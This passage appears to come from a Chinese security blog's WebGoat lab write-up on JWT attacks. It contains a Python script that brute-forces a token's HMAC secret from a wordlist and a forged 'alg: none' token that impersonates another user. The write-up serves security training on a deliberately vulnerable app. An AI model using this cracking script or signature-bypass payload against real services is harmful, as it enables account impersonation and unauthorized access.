密钥爆破攻击（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT 密钥爆破攻击（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205171436379.png" alt="image-20220205171436379"></p><p>JWT cracking——爆破，需要使用python脚本进行爆破，前提需自备字典。字典够强，就可以跑出来——<a href="https://wws.lanzous.com/icZOyfpz24b"><a href="https://lanzoux.com/icZOyfpz24b">m0re.txt - 蓝奏云 (lanzoux.com)</a></a><br>可以用我现在用的这个试试。测试呢嘛，就直接在源码里找到密码插进去就行。</p><p>注意需要pip安装PyJWT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> termcolor<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    jwt_str = <span class="hljs-string">R&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0NDA1ODU2MCwiZXhwIjoxNjQ0MDU4NjIwLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.OaUiWkNbWlZ2I1owqEeGX1DXTBw3ZRH-Yf3GOX1mXtc&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;‪C:\\Users\\FATBOY\\Desktop\\m0re.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            key_ = line.strip()<br>            <span class="hljs-keyword">try</span>:<br>                jwt.decode(jwt_str, verify=<span class="hljs-literal">True</span>, key=key_)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="hljs-string">&#x27;green&#x27;</span>), <span class="hljs-string">&#x27;&lt;--&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\bfound it --&gt;&#x27;</span>, termcolor.colored(key_, <span class="hljs-string">&#x27;green&#x27;</span>), <span class="hljs-string">&#x27;&lt;--&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> jwt.exceptions.InvalidSignatureError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>                <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\bsorry! nothing be found.&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/43f09137/image-20220205185622947.png" alt="image-20220205185622947"></p><p>脚本跑出来密匙为 <strong>business</strong></p><p>继续去<a href="https://jwt.io/%E8%A7%A3%E5%AF%86">https://jwt.io/解密</a></p><p><img src="/posts/43f09137/image-20220205185819944.png" alt="image-20220205185819944"></p><p><img src="/posts/43f09137/image-20220205205823502.png" alt="image-20220205205823502"></p><h4 id="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT修改冒充伪造（WebGoat靶场）</h4><p><img src="/posts/43f09137/image-20220205214813724-16440688965541.png" alt="image-20220205214813724"></p><p><img src="/posts/43f09137/image-20220205214855195-16440689380832.png" alt="image-20220205214855195"></p><p>查看日志</p><p><img src="/posts/43f09137/image-20220205214912474.png" alt="image-20220205214912474"></p><p>发现token解密下</p><p><img src="/posts/43f09137/image-20220205214949819-16440689920343.png" alt="image-20220205214949819"></p><p>更改失效时间</p><p><img src="/posts/43f09137/image-20220205215204437.png" alt="image-20220205215204437"></p><p>使用第四关绕过签名的方法</p><p><img src="/posts/43f09137/image-20220205215938396.png" alt="image-20220205215938396"></p><p><img src="/posts/43f09137/image-20220205215912616.png" alt="image-20220205215912616"></p><p>payload</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ewogICJhbGciOiAib<span class="hljs-name">m9</span>uZSIKfQ.ewogICJpYXQiOiAx<span class="hljs-symbol">NTI2</span>MTMx<span class="hljs-symbol">NDExLAogICJleHAiOiAxNjQ0</span>MDc<span class="hljs-number">5</span>MTAzLAogICJhZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>ICJmYWxzZSIsCiAgI<span class="hljs-symbol">nVzZXIiOiAiVG9</span>tIgp<span class="hljs-number">9.</span><br></code></pre></td></tr></table></figure><p>点击checkout抓包</p><p><img src="/posts/43f09137/image-20220205215549153.png" alt="image-20220205215549153"></p><p>更改数据</p><p><img src="/posts/43f09137/image-20220205215817789-16440695032324.png" alt="image-20220205215817789"></p><h4 id="Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）"><a href="#Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）" class="headerlink" title="Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）"></a>Javaweb-身份验证攻击-JWT安全结合SQL注入（WebGoat靶场）</h4><p>参考：<a href="https://www.freebuf.com/vuls/216457.html">Java代码审计入门：WebGoat8（再会） - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
